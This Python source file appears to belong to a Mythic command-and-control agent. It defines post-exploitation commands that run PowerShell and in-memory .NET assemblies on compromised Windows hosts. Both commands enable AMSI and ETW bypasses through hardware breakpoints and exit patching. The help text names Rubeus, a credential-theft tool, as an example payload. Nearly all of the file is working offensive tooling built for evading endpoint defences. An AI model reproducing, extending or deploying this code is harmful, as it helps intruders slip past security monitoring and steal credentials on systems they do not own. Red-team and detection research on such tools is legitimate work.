from .Utils.u import *
import random
import string
import shlex
import os

logging.basicConfig( level=logging.INFO );

class PwPickArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                cli_name="command",
                type=ParameterType.String,
                description="command to run",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="script",
                cli_name="script",
                type=ParameterType.String,
                description="powershell script",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                parts = self.command_line.split()
                if len(parts) < 1:
                    raise ValueError("Usage: pwpick -command <command> [-script <url>]")
                self.add_arg("command", parts[0])
                if len(parts) > 1:
                    self.add_arg("script", parts[1])

class PwPickCommand(CommandBase):
    cmd = "dotnet-pwpick"
    needs_admin = False
    help_cmd = "dotnet-pwpick -command [command] [-script [script]]"
    description = "Run powershell command without spawning powershell.exe inline using PowerPick"
    version = 1
    author = "@Oblivion"
    argument_class = PwPickArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        alias=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        script  = task.args.get_arg("script") or ""
        command = task.args.get_arg("command")

        display_params = f"-command \"{command}\""
        if task.args.get_arg("script"):
            display_params += f" -script \"{script}\""

        task.args.remove_arg("script")
        task.args.remove_arg("command")
        
        logging.info(f"Callback UUID: {task.Callback.AgentCallbackID}")

        AgentData = await StorageExtract( task.Callback.AgentCallbackID )

        bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]
        patchexit     = AgentData["evasion"]["dotnet_bypass_exit"]

        AgentData = await StorageExtract( task.Callback.AgentCallbackID )

        bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]

        bypass_flags = 0
        DisplayMsg   = ""

        if bypass_dotnet == "AMSI":
            bypass_flags = 0x700
        elif bypass_dotnet == "ETW":  
            bypass_flags = 0x400     
        elif bypass_dotnet == "AMSI and ETW":  
            bypass_flags = 0x100

        if bypass_dotnet != "None":
            DisplayMsg += f"[+] Using Hardware Breakpoint to bypass {bypass_dotnet}\n"
        else:
            DisplayMsg += f"[+] Hardware Breakpoint bypass disabled\n"

        if bool( patchexit ) is True:
            DisplayMsg += f"[+] Patch exit Enabled\n"
        else:
            DisplayMsg += f"[+] Patch exit Disabled\n"

        await write_console( task.Task.ID, DisplayMsg )

        args   = task.args.get_arg('args')
        vers   = task.args.get_arg('version')
        appdm  = task.args.get_arg('appdomain')
        method = task.args.get_arg('method')

        if method == "inline": 
            method = 0
        else: 
            method = 1

        task.args.remove_arg("args")
        task.args.remove_arg("version")
        task.args.remove_arg("keep")
        task.args.remove_arg("appdomain")

        content: bytes = await get_content_by_name("kh_dotnet_assembly.x64.bin", task.Task.ID)
        if not content:
            raise Exception("File BOF 'kh_dotnet_assembly.x64.bin' not found!")

        pwpick_content: bytes = await get_content_by_name("kh_pwsh.x64.exe", task.Task.ID)
        args:str = f"\"{command}\" \"{script}\""

        method = 0

        characters = string.ascii_letters + string.digits 
        appdom = ''.join(random.choice(characters) for _ in range(10))

        sc_args = [
            {"type": "int32", "value": method},
            {"type": "bytes", "value": pwpick_content.hex()},  
            {"type": "char" , "value": args},                        
            {"type": "char" , "value": appdom},                       
            {"type": "char" , "value": "v0.0.00000"},                        
            {"type": "int32", "value": 0},           # keep load
            {"type": "int32", "value": bypass_flags},                
            {"type": "int32", "value": patchexit},                   
            {"type": "int32", "value": 0},           # spoof                 
        ]

        task.args.add_arg("method", method, ParameterType.Number)    # reserved value
        task.args.add_arg("sc_file", content.hex())
        task.args.add_arg("sc_args", json.dumps(sc_args))
        task.args.add_arg("reserved_2", 0, ParameterType.Number)    # reserved value
        task.args.add_arg("reserved_3", 0, ParameterType.Number)    # reserved value

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="post_ex",
            TokenID=task.Task.TokenID,
            DisplayParams=display_params
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

class DotnetVerArguments( TaskArguments ):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass

class DotnetExecArguments( TaskArguments ):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="file",
                type=ParameterType.String,
                dynamic_query_function=self.get_exe_files,
                description="Name or UUID of existing .NET assembly to execute",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]
            ),
            CommandParameter(
                name="args",
                cli_name="args",
                type=ParameterType.String,
                description="Arguments to pass to the assembly",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]
            ),
            CommandParameter(
                name="appdomain",
                cli_name="appdomain",
                type=ParameterType.String,
                description="AppDomain name to use (random if not specified)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]
            ),
            # CommandParameter(  todo add keep
            #     name="keep",
            #     cli_name="keep",
            #     type=ParameterType.Number,
            #     description="Keep the AppDomain loaded after execution",
            #     parameter_group_info=[
            #         ParameterGroupInfo(
            #             required=False,
            #             group_name="Default",
            #         ),
            #     ]
            # ),
            CommandParameter(
                name="version",
                cli_name="version",
                type=ParameterType.String,
                description=".NET version to use (default: v4.0.30319)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]
            ),
            CommandParameter(
                name="method",
                type=ParameterType.ChooseOne,
                description="using inline method (default: inline)",
                choices=["inline"], # todo add fork
                default_value="inline",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                    ),
                ]
            )
        ]
        
    async def parse_dictionary(self, dictionary: dict) -> None:
        if not isinstance(dictionary, dict):
            raise ValueError("Input must be a dictionary")
        
        if not any(key in dictionary for key in ["file", "upload"]):
            raise ValueError("Either 'file' or 'upload' must be specified")

        if "file" in dictionary:
            if not isinstance(dictionary["file"], str):
                raise ValueError("'file' must be a string (name or UUID)")
            self.add_arg("file", dictionary["file"])

        if "appdomain" in dictionary:
            if not isinstance(dictionary["appdomain"], str):
                raise ValueError("'appdomain' must be a string")
            self.add_arg("appdomain", dictionary["appdomain"])
        else:
            self.add_arg("appdomain", ''.join(random.choice(string.ascii_letters) for _ in range(8)))

        if "method" in dictionary:
            self.add_arg("method", dictionary["method"])

        if "keep" in dictionary:
            self.add_arg("keep", 1)
        else:
            self.add_arg("keep", 0)

        if "version" in dictionary:
            self.add_arg("version", dictionary.get("version", dictionary["version"]))
        else:
            self.add_arg("version", dictionary.get("version", "v0.0.00000"))

        args = dictionary.get("args", "")
        if isinstance(args, list):
            args = " ".join(args)
        elif not isinstance(args, str):
            args = str(args)
        
        if len(args) >= 2 and args[0] == args[-1] and args[0] in ('"', "'"):
            args = args[1:-1]
        
        self.add_arg("args", args)

        if "upload" in dictionary and not os.path.exists(dictionary["upload"]):
            raise ValueError(f"File not found: {dictionary['upload']}")

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply command line arguments")
        
        if self.command_line[0] == "{":
            try:
                dictionary = json.loads(self.command_line)
                await self.parse_dictionary(dictionary)
            except json.JSONDecodeError:
                raise ValueError("Invalid JSON format")
        else:
            try:
                argv = shlex.split(self.command_line)
                args_dict = {}
                i = 0
                
                while i < len(argv):
                    arg = argv[i]
                    if arg == "-file":
                        if i+1 >= len(argv):
                            raise ValueError("Missing value for -file")
                        args_dict["file"] = argv[i+1]
                        i += 2
                    elif arg == "-upload":
                        if i+1 >= len(argv):
                            raise ValueError("Missing value for --upload")
                        args_dict["upload"] = argv[i+1]
                        i += 2
                    elif arg == "-args":
                        if i+1 >= len(argv):
                            raise ValueError("Missing value for -args")
                        args_dict["args"] = argv[i+1]
                        i += 2
                    elif arg == "-appdomain":
                        if i+1 >= len(argv):
                            raise ValueError("Missing value for -appdomain")
                        args_dict["appdomain"] = argv[i+1]
                        i += 2
                    elif arg == "-method":
                        args_dict["method"] = argv[i+1]
                    elif arg == "-keep":
                        args_dict["keep"] = True
                        i += 1
                    elif arg == "-version":
                        if i+1 >= len(argv):
                            raise ValueError("Missing value for -version")
                        args_dict["version"] = argv[i+1]
                        i += 2
                    else:
                        raise ValueError(f"Unknown argument: {arg}")
                
                await self.parse_dictionary(args_dict)
                
            except Exception as e:
                raise ValueError(f"Error parsing command line: {str(e)}")

    async def get_exe_files(self, callback: PTRPCDynamicQueryFunctionMessage) -> PTRPCDynamicQueryFunctionMessageResponse:
        response = PTRPCDynamicQueryFunctionMessageResponse()
        file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
            CallbackID=callback.Callback,
            LimitByCallback=False,
            IsDownloadFromAgent=False,
            IsScreenshot=False,
            IsPayload=False,
            Filename="",
        ))
        if file_resp.Success:
            file_names = []
            for f in file_resp.Files:
                if f.Filename not in file_names and f.Filename.endswith(".exe"):
                    file_names.append(f.Filename)
            response.Success = True
            response.Choices = file_names
            return response
        else:
            await SendMythicRPCOperationEventLogCreate(MythicRPCOperationEventLogCreateMessage(
                CallbackId=callback.Callback,
                Message=f"Failed to get files: {file_resp.Error}",
                MessageLevel="warning"
            ))
            response.Error = f"Failed to get files: {file_resp.Error}"
            return response

class DotnetExecCommand(CommandBase):
    cmd = "dotnet-exec"
    needs_admin = False
    help_cmd = \
    """
    Execute a .NET assembly in the current process

    Usage with existing file:
        dotnet-inline -file <name_or_uuid> [-args "<arguments>"] [-appdomain <name>] [-version <version>]

    Options:
        -file       Name or UUID of existing .NET assembly
        -args       Arguments to pass to assembly (use quotes for complex args)
        -appdomain  AppDomain name (random if not specified)
        -version    .NET version (default: use the last versions available)

    Examples:
        dotnet-inline -file Rubeus.exe -args "triage"
        dotnet-inline -file cf2bde20-d03e-461a-a3dd-a8a5a2693bf0 -args "-group=user"
    """
    description = "Execute a .NET assembly in the current process with support for file uploads and complex arguments"
    version = 2
    author = "@ Oblivion"
    argument_class = DotnetExecArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
        builtin=True,
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        file_name = None
        file_id = None
        file_contents = None
        
        if task.args.get_arg("file"):
            file_identifier = task.args.get_arg("file")
            
            if len(file_identifier) == 36 and '-' in file_identifier:
                file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=task.Task.ID,
                    AgentFileID=file_identifier,
                    LimitByCallback=True,
                    MaxResults=1
                ))
            else:
                file_search = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    TaskID=task.Task.ID,
                    Filename=file_identifier,
                    LimitByCallback=False,
                    MaxResults=1
                ))
            
            if file_search.Success is False or len(file_search.Files) < 0: 
                raise Exception(f"File '{file_identifier}' not found in Mythic")
            
            file_id = file_search.Files[0].AgentFileId
            file_name = file_search.Files[0].Filename
            
            file_contents = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
                AgentFileId=file_id
            ))
            
            if not file_contents.Success:
                raise Exception(f"Failed to get contents of file '{file_name}'")
        
        else:
            raise Exception("Either -file or -upload must be specified")

        display_params  = ""
        
        display_params +=f"-file {file_name}"

        if task.args.get_arg("args"):
            display_params += f" -args \"{task.args.get_arg('args')}\""
        else:
            task.args.set_arg("args", " ");
        
        display_params += f" -appdomain {task.args.get_arg('appdomain')}"
        
        task.args.remove_arg("file")
        
        if task.args.get_arg('version') != "v0.0.00000":
            display_params += f" -version {task.args.get_arg('version')}"
        
        logging.info(f"Callback UUID: {task.Callback.AgentCallbackID}")

        AgentData = await StorageExtract( task.Callback.AgentCallbackID )

        bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]
        patchexit     = AgentData["evasion"]["dotnet_bypass_exit"]

        bypass_flags = 0

        DisplayMsg  = f"[+] Sending {file_name} with {len(file_contents.Content)} bytes\n"

        if bypass_dotnet == "AMSI":
            bypass_flags = 0x700
        elif bypass_dotnet == "ETW":  
            bypass_flags = 0x400     
        elif bypass_dotnet == "AMSI and ETW":  
            bypass_flags = 0x100

        if bypass_dotnet != "None":
            DisplayMsg += f"[+] Using Hardware Breakpoint to bypass {bypass_dotnet}\n"
        else:
            DisplayMsg += f"[+] Hardware Breakpoint bypass disabled\n"

        if bool( patchexit ) is True:
            DisplayMsg += f"[+] Patch exit Enabled\n"
        else:
            DisplayMsg += f"[+] Patch exit Disabled\n"

        await write_console( task.Task.ID, DisplayMsg )

        args   = task.args.get_arg('args')
        vers   = task.args.get_arg('version')
        appdm  = task.args.get_arg('appdomain')
        method = task.args.get_arg('method')

        if method == "inline": 
            method = 0
        else: 
            method = 1

        task.args.remove_arg("args")
        task.args.remove_arg("version")
        task.args.remove_arg("keep")
        task.args.remove_arg("appdomain")

        content: bytes = await get_content_by_name("kh_dotnet_assembly.x64.bin", task.Task.ID)
        if not content:
            raise Exception("File BOF 'kh_dotnet_assembly.x64.bin' not found!")

        method = 0

        sc_args = [
            {"type": "int32", "value": method},
            {"type": "bytes", "value": file_contents.Content.hex()},  
            {"type": "char" , "value": args},                        
            {"type": "char" , "value": appdm},                       
            {"type": "char" , "value": vers},                        
            {"type": "int32", "value": 0},           # keep load
            {"type": "int32", "value": bypass_flags},                
            {"type": "int32", "value": patchexit},                   
            {"type": "int32", "value": 0},           # spoof                 
        ]

        task.args.add_arg("method", method, ParameterType.Number)    # reserved value
        task.args.add_arg("sc_file", content.hex())
        task.args.add_arg("sc_args", json.dumps(sc_args))
        task.args.add_arg("reserved_2", 0, ParameterType.Number)    # reserved value
        task.args.add_arg("reserved_3", 0, ParameterType.Number)    # reserved value

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            CommandName="post_ex",
            TokenID=task.Task.TokenID,
            DisplayParams=display_params
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if not response:
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )

        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )